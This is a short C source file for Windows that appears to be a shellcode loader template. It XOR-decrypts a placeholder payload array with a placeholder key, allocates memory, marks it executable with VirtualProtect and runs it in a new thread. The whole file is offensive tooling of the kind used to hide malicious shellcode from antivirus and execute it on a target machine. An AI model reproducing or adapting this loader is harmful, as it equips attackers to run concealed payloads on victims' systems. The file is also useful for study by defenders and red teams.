#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char payl[] = { <XOR PAYLOAD> };
	unsigned int len = sizeof(payl);
	char key[] = "<KEY>";

	// Allocate a buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decrypt (DeXOR) the payload
	XOR((char *) payl, len, key, sizeof(key));
	
	// Copy the payload to allocated buffer
	RtlMoveMemory(exec_mem, payl, len);
	
	// Set the buffer executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}